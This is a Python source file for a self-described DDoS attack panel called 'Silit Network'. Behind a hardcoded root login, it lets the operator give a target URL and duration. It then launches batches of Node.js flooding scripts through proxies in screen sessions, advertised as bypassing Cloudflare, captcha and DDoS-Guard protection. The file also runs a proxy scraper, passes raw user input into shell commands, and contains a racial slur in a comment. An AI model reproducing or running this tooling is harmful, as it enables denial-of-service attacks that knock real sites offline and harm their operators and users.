import socket

import os

import requests

import random

import getpass

import time

import sys

from operator import index

import socket

import random

import string

import threading

import getpass

import urllib

import getpass

from colorama import Fore, Back

import os,sys,time,re,requests,json

from requests import post

from time import sleep

from datetime import datetime, date

from pystyle import Colors, Colorate

import codecs



def clear():

    os.system('cls' if os.name == 'nt' else 'clear')



def logo():

	clear()

	sys.stdout.write(f" Silit-Network --> User: [0/10] | Star: [100] | Method: [13] | Silit Network DDoS Panel")

	print("""


░██╗░░░░░░░██╗███████╗██╗░░░░░░█████╗░░█████╗░███╗░░░███╗███████╗
░██║░░██╗░░██║██╔════╝██║░░░░░██╔══██╗██╔══██╗████╗░████║██╔════╝
░╚██╗████╗██╔╝█████╗░░██║░░░░░██║░░╚═╝██║░░██║██╔████╔██║█████╗░░
░░████╔═████║░██╔══╝░░██║░░░░░██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░
░░╚██╔╝░╚██╔╝░███████╗███████╗╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗
░░░╚═╝░░░╚═╝░░╚══════╝╚══════╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝

""")





def methods():

	clear()
	
	sys.stdout.write(f" Silit-Network --> User: [0/10] | Star: [100] | Method: [13] | Silit Network DDoS Panel")

	print("""


███╗░░░███╗███████╗████████╗██╗░░██╗░█████╗░██████╗░░██████╗
████╗░████║██╔════╝╚══██╔══╝██║░░██║██╔══██╗██╔══██╗██╔════╝
██╔████╔██║█████╗░░░░░██║░░░███████║██║░░██║██║░░██║╚█████╗░
██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██║██║░░██║██║░░██║░╚═══██╗
██║░╚═╝░██║███████╗░░░██║░░░██║░░██║╚█████╔╝██████╔╝██████╔╝
╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═════╝░╚═════╝░

TLS - VERY POWERFUL TLS METHODS [VVIP]

MIX - ALL METHODS IN ONE [VVIP]

RAPID - SEND DDOS ATTACK FOR PROTECTION CLOUDFLARE UAM [VVIP]

CRASH - NORMAL BYPASS [BASIC]

HTTP-SILIT - POWERFULL METHOD FOR BYPASS CAPTCHA, PROTECTION CUSTOM, UAM AND DDoS-GUARD [VVIP]

PROXY: Proxy Scrape

PAPING: Pa Ping Site

OWNER >> @AkuHengkerEfEf
CHANNEL >> @SilitNetwork

⚠️NOTE⚠️
DO NOT SPAM ATTACKS ❗️❗️❗️


🚀ATTACKS🚀
METHODS URL TIME

""")



def main():

    logo()

    while(True):

        cnc = input(Colorate.Diagonal(Colors.yellow_to_red, "root@SilitNetwork#~"))

        if cnc == "Methods" or cnc == "methods" or cnc == "METHOD" or cnc == "METHODS":

            methods()

        elif cnc == "Clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":

            main()
                
                
                
        elif "TLS" in cnc:

            try: 

                host = cnc.split()[1]

                time = cnc.split()[2]

                os.system(f'screen node TLS {host} {time} 32 10 proxy.txt root')
                os.system(f'screen node TLS-SILIT {host} {time} 32 10 proxy.txt')
                os.system(f'screen node TLS-SILITv2 {host} {time} 32 10 proxy.txt')
                os.system(f'screen node TLS-SILITv3 {host} {time} 32 10 proxy.txt')
                os.system(f'screen node TLS-LOST {host} {time} 32 10')
                os.system(f'screen node TLS-ZOXC.js {host} {time}')

                print('Attack Successfuly sent to all server')

            except IndexError:

                print('Usage: METHODS URL TIME');

                print('Example: URL https://example.com 120 60');        
                

        elif "MIX" in cnc:

            try: 

                host = cnc.split()[1]

                time = cnc.split()[2]
                os.system(f'screen node TLS-SILIT {host} {time} 32 10 proxy.txt')
                os.system(f'screen node TLS-SILITv2 {host} {time} 32 10 proxy.txt')
                os.system(f'screen node TLS-SILITv3 {host} {time} 32 10 proxy.txt')
                os.system(f'screen node TLS {host} {time} 32 10 proxy.txt root')
                os.system(f'screen node HTTP-SILIT {host} {time} 32 10 proxy.txt')
                os.system(f'screen node KILL {host} {time} 32 10 proxy.txt')
                os.system(f'screen node ANALKILL {host} {time} 50 10')
                os.system(f'screen node STROKE {host} {time} 32 10 proxy.txt')
                os.system(f'screen node THOR {host} {time} 32 10 proxy.txt')
                os.system(f'screen node THORv2 {host} {time} 32 10 proxy.txt')
                os.system(f'screen node THORv3 {host} {time} 32 10 proxy.txt')
                os.system(f'screen node TLS-CUM {host} {time} 32 10')
                os.system(f'screen node TLS-NARUTO {host} 100 1024 {time}')
                os.system(f'screen node SILITBYPASS {host} {time} 35 10 proxy.txt')     
                os.system(f'screen node Rapid-Silit {host} {time} 10 proxy.txt 32 uam')
                os.system(f'screen node Rapid-Silit {host} {time} 10 proxy.txt 32 captcha')
                os.system(f'screen node chrome {host} {time} 32 65 proxy.txt captcha')
                os.system(f'screen node TLS-ZOXC.js {host} {time}')

                print('Attack Successfuly sent to all server')

            except IndexError:

                print('Usage: METHODS URL TIME');

                print('Example: MIX https://example.com 120');

                

        elif "RAPID" in cnc:

            try: 

                host = cnc.split()[1]

                time = cnc.split()[2]

                os.system(f'screen node Rapid-Silit {host} {time} 10 proxy.txt 32 uam')
                os.system(f'screen node chromev4 {host} {time} 32 10 proxy.txt uam')
                os.system(f'screen node Rapid-Silit {host} {time} 10 proxy.txt 32 captcha')
                os.system(f'screen node chromev4 {host} {time} 32 10 proxy.txt captcha')


                print('Attack Successfuly sent to all server')

            except IndexError:

                print('Usage: METHODS');

                print('Example: RAPID https://example.com 60');



        elif "CRASH" in cnc:

            try: 

                host = cnc.split()[1]

                time = cnc.split()[2]

                os.system(f'screen node Crash-Silit {host} {time} 35 10 proxy.txt')

                print('Attack Successfuly sent to all server')
                
            except IndexError:

                print('Usage: METHODS URL TIME');

                print('Example: CRASH https://example.com 60');

                

        elif "HTTP-SILIT" in cnc:

            try: 

                host = cnc.split()[1]

                time = cnc.split()[2]

                os.system(f'screen node HTTP-SILIT {host} {time} 600 10 proxy.txt')
                os.system(f'screen node Rapid-Silit {host} {time} 10 proxy.txt 32 uam')
                os.system(f'screen node chromev4 {host} {time} 32 10 proxy.txt')

                print('Attack Successfuly sent to all server')

            except IndexError:

                print('Usage: METHODS URL TIME');
                print('Example: HTTP-SILIT https://example.com 60')



        elif "PROXY" in cnc:

            try: 

                os.system(f'python3 scrape.py')

            except IndexError:

                print('Usage: PROXY');

                print('Example: PROXY');



        elif "PAPING" in cnc:

            try:

                ip = cnc.split()[1]

                port = cnc.split()[2]

                time = cnc.split()[3]

                os.system(f'python3 paping.py {ip} {port}')

            except IndexError:

                print('Usage: paping <ip> <port> <time>')

                print('Example: paping 1.1.1.1 443 120')

                

                

#only niggs dont understand

        elif "help" in cnc:

            print(f'''  
            

██╗░░██╗███████╗██╗░░░░░██████╗░
██║░░██║██╔════╝██║░░░░░██╔══██╗
███████║█████╗░░██║░░░░░██████╔╝
██╔══██║██╔══╝░░██║░░░░░██╔═══╝░
██║░░██║███████╗███████╗██║░░░░░
╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░░░░                          

» Methods : To show methods 

» Clear: To clear all messages

            ''')

        else:

            try:

                cmmnd = cnc.split()[0]

                print("Command: [ " + cmmnd + " ] Not Found!")

            except IndexError:

                pass

                



# LOG-IN

def login():

    clear()

    user = "root"

    passwd = "LU6qeD_kPXeY"

    username = input("Username: ")

    password = getpass.getpass(prompt='Password: ')

    if username != user or password != passwd:

        print("")

        print("Sorry, the password/username you entered is wrong!!!")

        sys.exit(1)

    elif username == user and password == passwd:

        print("Welcome to SilitNetwork Panel!!!...")

        time.sleep(0.9)

        print("Wellcome To Panel Ddos")

        time.sleep(0.9)

        main()



login()